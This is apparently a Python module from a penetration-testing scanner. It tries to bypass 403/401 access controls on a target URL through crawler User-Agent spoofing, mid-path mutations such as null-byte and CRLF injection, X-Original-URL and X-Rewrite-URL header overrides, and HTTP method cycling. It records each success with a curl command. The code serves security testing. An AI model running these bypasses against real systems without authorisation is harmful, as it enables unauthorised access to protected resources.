"""Enhanced 403/401 Bypass Scanner — additions from nomore403 research.

Adds:
- User-Agent rotation bypasses
- Mid-path mutations
- Nginx-specific headers
- Auto HTTP method cycling
"""

from __future__ import annotations

from typing import Dict, List
from urllib.parse import urlparse

from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter


# ---------------------------------------------------------------------------
# User-Agent bypass payloads
# ---------------------------------------------------------------------------

USER_AGENT_BYPASS: List[tuple] = [
    ("googlebot", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
    ("bingbot", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"),
    ("slurp", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"),
    ("duckduckbot", "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"),
    ("baiduspider", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"),
    ("yandexbot", "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"),
    ("facebookbot", "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"),
    ("twitterbot", "Twitterbot/1.0"),
    ("linkedinbot", "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpAsyncClient/4.1.4)"),
    ("applebot", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1)"),
    ("curl", "curl/7.64.1"),
    ("python-requests", "python-requests/2.25.1"),
]

# ---------------------------------------------------------------------------
# Mid-path mutation payloads
# ---------------------------------------------------------------------------

MIDPATH_MUTATIONS: List[tuple] = [
    ("null_byte_mid", "Null byte in middle of path", lambda path: _mid_mutate(path, "%00")),
    ("split_path", "Split path with slash", lambda path: _mid_mutate(path, "/")),
    ("query_mid", "Query marker in middle", lambda path: _mid_mutate(path, "?")),
    ("fragment_mid", "Fragment in middle", lambda path: _mid_mutate(path, "#")),
    ("crlf_mid", "CRLF in middle of path", lambda path: _mid_mutate(path, "%0d%0a")),
    ("backslash_mid", "Backslash in middle", lambda path: _mid_mutate(path, "%5c")),
]


def _mid_mutate(path: str, injection: str) -> str:
    """Inject a string in the middle of the path."""
    clean = path.lstrip("/")
    if len(clean) < 2:
        return path
    mid = len(clean) // 2
    return "/" + clean[:mid] + injection + clean[mid:]


# ---------------------------------------------------------------------------
# Nginx-specific headers
# ---------------------------------------------------------------------------

NGINX_HEADERS: List[tuple] = [
    ("x-original-url", {"X-Original-URL": None}, "Nginx X-Original-URL bypass — set to original path"),
    ("x-rewrite-url", {"X-Rewrite-URL": None}, "Nginx X-Rewrite-URL bypass — set to original path"),
    ("x-forwarded-scheme", {"X-Forwarded-Scheme": "https"}, "X-Forwarded-Scheme override"),
    ("x-forwarded-proto", {"X-Forwarded-Proto": "https"}, "X-Forwarded-Proto override"),
]

# ---------------------------------------------------------------------------
# HTTP methods to auto-test
# ---------------------------------------------------------------------------

ADDITIONAL_METHODS = ["PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "HEAD"]


# ---------------------------------------------------------------------------
# Main enhanced scanner
# ---------------------------------------------------------------------------

class BypassEnhanced:
    """Enhanced 403/401 bypass techniques from nomore403 research."""

    NAME = "bypass_enhanced"

    def __init__(self, rps: float = 10.0, timeout: float = 10.0):
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    def scan_url(self, url: str, methods: List[str] = None) -> List[Finding]:
        """Run enhanced bypass techniques against a URL."""
        import httpx

        if methods is None:
            methods = ["GET"]

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"
        base = f"{parsed.scheme}://{parsed.netloc}"

        client = httpx.Client(
            verify=False, timeout=self.timeout, follow_redirects=False,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        )

        try:
            # Capture baseline
            self.limiter.wait(host)
            try:
                baseline = client.get(url)
                baseline_status = baseline.status_code
                baseline_len = len(baseline.content)
            except Exception:
                baseline_status = 0
                baseline_len = 0

            if baseline_status not in (401, 403):
                logger.info(f"Baseline returned {baseline_status} — still testing enhanced techniques")

            # 1. User-Agent rotation
            for ua_name, ua_value in USER_AGENT_BYPASS:
                self.limiter.wait(host)
                try:
                    resp = client.get(url, headers={"User-Agent": ua_value})
                    if self._is_bypass(resp, baseline_status, baseline_len):
                        findings.append(self._make_finding(
                            url, "GET", f"User-Agent: {ua_value}",
                            f"UA bypass ({ua_name})", resp, baseline_status, baseline_len,
                            f"User-Agent rotation to {ua_name} bypassed access control",
                        ))
                except Exception:
                    pass

            # 2. Mid-path mutations
            for name, desc, transform in MIDPATH_MUTATIONS:
                mutated_path = transform(path)
                mutated_url = base + mutated_path
                self.limiter.wait(host)
                try:
                    resp = client.get(mutated_url)
                    if self._is_bypass(resp, baseline_status, baseline_len):
                        findings.append(self._make_finding(
                            mutated_url, "GET", mutated_path,
                            f"Mid-path: {desc}", resp, baseline_status, baseline_len,
                            f"Mid-path mutation '{name}' bypassed access control",
                        ))
                except Exception:
                    pass

            # 3. Nginx-specific headers
            for name, headers_template, desc in NGINX_HEADERS:
                headers = {}
                for k, v in headers_template.items():
                    headers[k] = v if v is not None else path
                self.limiter.wait(host)
                try:
                    resp = client.get(url, headers=headers)
                    if self._is_bypass(resp, baseline_status, baseline_len):
                        findings.append(self._make_finding(
                            url, "GET", str(headers),
                            f"Nginx: {desc}", resp, baseline_status, baseline_len,
                            f"Nginx header '{name}' bypassed access control",
                        ))
                except Exception:
                    pass

            # 4. Auto HTTP method cycling
            all_methods = list(set(methods + ADDITIONAL_METHODS))
            for method in all_methods:
                if method == "GET":
                    continue  # already tested
                self.limiter.wait(host)
                try:
                    resp = client.request(method, url)
                    if self._is_bypass(resp, baseline_status, baseline_len):
                        findings.append(self._make_finding(
                            url, method, "",
                            f"HTTP method: {method}", resp, baseline_status, baseline_len,
                            f"HTTP method {method} bypassed access control",
                        ))
                except Exception:
                    pass

            # 5. Combined: User-Agent + HTTP method
            for ua_name, ua_value in USER_AGENT_BYPASS[:3]:
                for method in ["PUT", "PATCH", "OPTIONS"]:
                    self.limiter.wait(host)
                    try:
                        resp = client.request(method, url, headers={"User-Agent": ua_value})
                        if self._is_bypass(resp, baseline_status, baseline_len):
                            findings.append(self._make_finding(
                                url, method, f"UA: {ua_value}",
                                f"Combined: {method} + {ua_name} UA", resp, baseline_status, baseline_len,
                                f"HTTP {method} with {ua_name} User-Agent bypassed access control",
                            ))
                    except Exception:
                        pass

        finally:
            client.close()

        logger.info(f"Enhanced bypass: {len(findings)} findings")
        return findings

    def _is_bypass(self, resp, baseline_status: int, baseline_len: int) -> bool:
        """Check if response indicates a successful bypass."""
        status = resp.status_code
        content_len = len(resp.content)

        # Status changed from blocked to allowed
        if baseline_status in (401, 403) and status not in (401, 403, 0):
            return True

        # Same status but significantly different content
        if baseline_status == status and baseline_len > 0:
            if content_len > baseline_len * 1.5 or content_len < baseline_len * 0.5:
                if content_len > 100:
                    return True

        # Redirect to non-error page
        if status in (301, 302, 307, 308):
            location = resp.headers.get("location", "")
            if location and "login" not in location.lower() and "error" not in location.lower():
                return True

        return False

    def _make_finding(
        self, url: str, method: str, payload: str,
        technique: str, resp, baseline_status: int, baseline_len: int,
        description: str,
    ) -> Finding:
        """Create a Finding from a successful bypass."""
        status = resp.status_code
        content_len = len(resp.content)

        evidence = f"Status: {baseline_status}→{status}, Size: {baseline_len}→{content_len}B"
        severity = "HIGH" if status == 200 else "MEDIUM"

        curl_parts = ["curl -k -i"]
        if method != "GET":
            curl_parts.append(f"-X {method}")
        if "User-Agent" in payload:
            ua = payload.split("User-Agent: ", 1)[-1] if "User-Agent: " in payload else payload
            curl_parts.append(f'-H "User-Agent: {ua}"')
        if "X-Original-URL" in payload or "X-Rewrite-URL" in payload:
            for hdr in payload.replace("{", "").replace("}", "").split(","):
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    curl_parts.append(f'-H "{k.strip()}: {v.strip()}"')
        curl_parts.append(f'"{url}"')
        curl_cmd = " ".join(curl_parts)

        return Finding(
            vuln_type="bypass_403",
            title=f"403 Bypass: {technique}",
            severity=severity,
            url=url,
            method=method,
            payload=payload[:200],
            evidence=evidence,
            description=description,
            remediation="Implement access control at the application layer, not just the web server level.",
            cwe="CWE-284",
            tool=self.NAME,
            verified=True,
            confidence="HIGH" if status == 200 else "MEDIUM",
            request=curl_cmd,
            response_snippet=resp.text[:500] if hasattr(resp, "text") else "",
        )


__all__ = ["BypassEnhanced", "USER_AGENT_BYPASS", "MIDPATH_MUTATIONS", "NGINX_HEADERS", "ADDITIONAL_METHODS"]
